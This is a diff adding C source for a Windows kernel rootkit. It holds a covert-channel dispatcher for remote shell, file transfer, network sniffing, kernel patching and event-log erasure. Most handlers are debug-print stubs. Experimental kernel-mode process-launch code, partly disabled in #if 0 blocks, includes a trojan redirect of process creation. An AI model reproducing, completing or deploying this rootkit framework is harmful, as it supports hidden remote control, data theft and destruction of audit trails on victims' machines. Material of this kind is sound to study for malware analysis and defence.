@@ -1,0 +1,361 @@
+
+#include "rk_driver.h"
+#include "rk_command.h"
+#include "rk_defense.h"
+
+/* COMMAND GROUP
+ * Covert channel command codes must be parsed
+ * skeleton functionality of rootkit is supplied
+ * within this logic.
+ * 
+ * Channel sequence is command code (1 octet), 
+ * then data length (2 octets), then data (data
+ * length octets).  The length and a pointer to
+ * the data are passed to every function.  A
+ * NULL pointer is passed if the data length is
+ * zero.
+ * 
+ * The parsing routine demands an ID of 0 for 
+ * the list terminator.
+ */
+
+COMMAND commands[] =
+{
+	{ 0x01, cmdExecuteProcess },
+	{ 0x02, cmdRemoteShell },
+	{ 0x03, cmdSendFile },
+	{ 0x04, cmdRecvFile },
+	{ 0x05, cmdSniffNetwork },
+	{ 0x06, cmdPatchKernel },
+	{ 0x07, cmdAddNetSnifferFilter },
+	{ 0x08, cmdAddFileSnifferFilter },
+	{ 0x09, cmdShutdown },
+	{ 0x0a, cmdKillAllClean },
+	{ 0x0b, cmdEraseEventLogs },
+	{ 0x00, NULL }
+};
+
+/* Parse and execute a channel command. */
+BOOL ExecuteChannelCommand( LPCOMMANDPACKET lpcp )
+{
+	LPCOMMAND	lpcmd;
+
+	/* walk through the list of commands */
+	for( lpcmd = &commands[0]; lpcmd->byCode; lpcmd++ )
+	{
+		/* does this command match the requested one? */
+		if( lpcmd->byCode == lpcp->byCode )
+		{
+			/* match found.  is there data? */
+			if( lpcp->cchData )
+				/* call the procedure and pass the data in */
+				lpcmd->proc( lpcp->cchData, lpcp->byData );
+			else
+				/* call the procedure without data */
+				lpcmd->proc( 0, NULL );
+
+			/* success! */
+			return TRUE;
+		}
+	}
+
+	/* failure */
+	return FALSE;
+}
+
+
+/* Launch a process */
+void cmdExecuteProcess(){
+	DbgPrint(("cmdExecuteProcess called\n"));
+}
+
+/* Create a remote shell */
+void cmdRemoteShell(){
+	DbgPrint(("cmdRemoteShell called\n"));
+}
+
+/* Send a file */
+void cmdSendFile(){
+	DbgPrint(("cmdSendFile called\n"));
+}
+
+/* Recv a file */
+void cmdRecvFile(){
+	DbgPrint(("cmdRecvFile called\n"));
+}
+
+/* Sniff the network */
+void cmdSniffNetwork(){
+	DbgPrint(("cmdSniffNetwork called\n"));
+}
+
+/* Install a Kernel patch */
+void cmdPatchKernel(){
+	DbgPrint(("cmdPatchKernel called\n"));
+}
+
+/* Add a network sniffer filter */
+void cmdAddNetSnifferFilter(){
+	DbgPrint(("cmdAddNetSnifferFilter called\n"));
+}
+
+/* Add a file sniffer filter */
+void cmdAddFileSnifferFilter(){
+	DbgPrint(("cmdAddFileSnifferFilter called\n"));
+}
+
+/* Shutdown rootkit */
+void cmdShutdown(){
+	DbgPrint(("cmdShutdown called\n"));
+}
+
+/* Kill all traces of rootkit & shutdown permenantly */
+void cmdKillAllClean(){
+	DbgPrint(("OnKillAllClean called\n"));
+}
+
+/* Erase all audit logs */
+void cmdEraseEventLogs(){
+	DbgPrint(("cmdEraseEventLogs called\n"));
+}
+
+
+/* ************ hardhat area below this point ******************* 
+ * 
+ * This area is research code - we are trying to
+ * figure out how to launch a Win32 process from
+ * kernel mode.  So far, we have not been sucessful
+ * so please help if you can!
+ *
+ * The proper series of events are:
+ *
+ * 	NtCreateFile() to open PE file
+ *	NtCreateSection() to map PE file to memory directly
+ *	NtCreateProcess() to create kernel-level process object & PEB
+ *	NtCreateThread() to create thread context and pass the address of the PEB
+ *	now send some sort of message to csrss.exe - don't know how this is done yet
+ *	which ends up starting the thread.
+ *
+ * **************************************************************/
+
+void TestCreateWin32Thread();
+void TestLaunchWin32Process();
+/* system call prototype */
+NTKERNELAPI
+NTSTATUS
+PsCreateSystemProcess( OUT PHANDLE ProcessHandle,                       
+					   IN ACCESS_MASK AccessMask,                       
+					   IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes );
+
+
+/* _________________________________________________
+ . This function is intended to launch a WIN32
+ . process.  So far, the process creation works.
+ . We are actually building a real process - the
+ . stumper right now is how to create the inital
+ . thread - we can create the process, but it doesn't
+ . >DO< anything until we start an initial thread!
+ . So far we haven't figured out how to initialize
+ . the thread context & stack for NtCreateThread().
+ . _________________________________________________ */
+
+void TestLaunchWin32Process()
+{
+	NTSTATUS rc;
+	HANDLE hProcessCreated, hProcessOpened, hFile, hSection;
+	OBJECT_ATTRIBUTES ObjectAttr;
+	UNICODE_STRING ProcessName;
+	UNICODE_STRING SectionName;
+	UNICODE_STRING FileName;
+	LARGE_INTEGER MaxSize;
+	ULONG SectionSize=8192;
+		
+
+	IO_STATUS_BLOCK ioStatusBlock;
+	ULONG allocsize = 0;
+
+	DbgPrint("starting TestLaunchProcess\n");
+
+	/* first open file w/ NtCreateFile 
+	 . this works for a Win32 image.  We could also use
+	 . cmd.exe /c for a shell.  calc.exe is just for testing.
+	 */
+
+	RtlInitUnicodeString(&FileName, L"\\??\\C:\\winnt\\system32\\calc.exe");
+	InitializeObjectAttributes( &ObjectAttr,
+								&FileName,
+								OBJ_CASE_INSENSITIVE,
+								NULL,
+								NULL);
+	
+
+	rc = ZwCreateFile(
+		&hFile,
+		GENERIC_READ | GENERIC_EXECUTE,
+		&ObjectAttr,
+		&ioStatusBlock,
+		&allocsize,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ,
+		FILE_OPEN,
+		0,
+		NULL,
+		0);
+	if (rc!=STATUS_SUCCESS) {
+		DbgPrint("Unable to open file, rc=%x\n", rc);
+		return 0;
+	}
+
+	/* then use NtCreateSection to map file */
+	
+	MaxSize.HighPart=0;
+	MaxSize.LowPart=SectionSize;
+
+	rc=ZwCreateSection(
+					&hSection,
+					SECTION_ALL_ACCESS,
+					NULL,
+					&MaxSize,
+					PAGE_READWRITE,
+					SEC_IMAGE,
+					hFile);
+	if (rc!=STATUS_SUCCESS) {
+		DbgPrint("Unable to create section, rc=%x\n", rc);
+		return 0;
+	}
+	DbgPrint("hSectionCreated=%x\n", hSection);
+	
+	/* ______________________________________
+	 . redirect createprocess!
+	 . ______________________________________ */
+	SetTrojanRedirectSection(hSection);
+
+
+	
+	/* then create process specific structures & address space */
+#if 0	
+	rc=	NewNtCreateProcess (
+                        &hProcessCreated,
+                        PROCESS_ALL_ACCESS,
+                        NULL,
+                        0xFFFFFFFF,
+                        TRUE,
+                        hSection,
+                        NULL,
+                        NULL);
+        
+	if (rc!=STATUS_SUCCESS) {
+		DbgPrint("Unable to create process, rc=%x\n", rc);
+		return 0;
+	}
+	DbgPrint("hProcessCreated=%x\n", hProcessCreated);
+	/* ________________________________
+	 . at this point we should have an
+	 . EPROCESS and KPROCESS block.
+	 . we must place this process at the end of the NT process list
+	 . w/ PsActiveProcessHead() ?
+	 . */
+
+	//TestCreateThread();
+
+	NtClose(hProcessCreated);
+#endif
+}
+
+
+#if 0
+void TestCreateWin32Thread()
+{
+	UNICODE_STRING ThreadName;
+	OBJECT_ATTRIBUTES ObjectAttr;
+	NTSTATUS rc;
+	HANDLE hThreadCreated, hThreadOpened;
+	CLIENT_ID ClientId;
+	CONTEXT Context;
+	STACKINFO StackInfo;
+	LARGE_INTEGER Timeout;
+	ULONG SuspendCount;
+
+	RtlInitUnicodeString(&ThreadName, L"\\MyThread");
+
+	InitializeObjectAttributes(&ObjectAttr,
+								&ThreadName,
+								OBJ_CASE_INSENSITIVE,
+								NULL,
+								NULL);
+
+	StackInfo.TopOfStack=(ULONG)&Stack[STACK_SIZE];
+	StackInfo.BottomOfStack=(ULONG)&Stack[-1];
+	StackInfo.OnePageBelowTopOfStack=(ULONG)(&Stack[STACK_SIZE]-4096);
+
+
+	Context.ContextFlags=CONTEXT_FULL;
+	rc=NtGetContextThread(NtCurrentThread(), &Context);
+	if (rc!=STATUS_SUCCESS) {
+		DbgView("Unable to get context of current thread\n");
+		return;
+	}
+	
+	Context.Eip=(ULONG)ThreadFunc;
+	Context.Esp=StackInfo.TopOfStack;
+
+	rc=NtCreateThread(&hThreadCreated,
+						THREAD_ALL_ACCESS,
+						&ObjectAttr,
+						NtCurrentProcess(),
+						&ClientId,
+						&Context,
+						&StackInfo,
+						FALSE);
+	if (rc!=STATUS_SUCCESS) {
+		printf("Unable to create thread, rc=%x\n", rc);
+		return;
+	}
+}
+#endif
+
+VOID testCreateSystemProcess(void)
+/* testing PsCreateSystemProcess()
+ *
+ * - this is a bunch of crap and doesn't work 
+ * - greg
+ */
+{
+#if 0
+ HANDLE hProcess;
+ OBJECT_ATTRIBUTES objectAttributes0;
+ UNICODE_STRING NewProcessUnicodeString;
+ static WCHAR NewProcessName[] = L"MyProcess"; 
+ NTSTATUS NtStatus;
+ 
+ DbgPrint(("testCreateProcess called\n"));
+
+ //__asm int 3
+
+ NewProcessUnicodeString.Buffer = NewProcessName;
+ NewProcessUnicodeString.Length = wcslen(NewProcessName)*2;
+ 
+ InitializeObjectAttributes(
+                          &objectAttributes0,
+                          &NewProcessUnicodeString,
+                          OBJ_CASE_INSENSITIVE,
+                          (HANDLE)NULL,
+                          (PSECURITY_DESCRIPTOR)NULL
+                          );
+ 
+ NtStatus = PsCreateSystemProcess( &hProcess,
+                                   PROCESS_ALL_ACCESS,
+                                   &objectAttributes0 );
+#endif
+
+ 
+#if 0
+ /* working on another method here w/ systemservice table */
+	NTSTATUS ntstatus;
+	ntstatus = gfNtCreateProcess( 
+			KeyHandle, Index, KeyInformationClass,
+                        KeyInformation, Length, pResultLength );
+#endif
+}
+
+
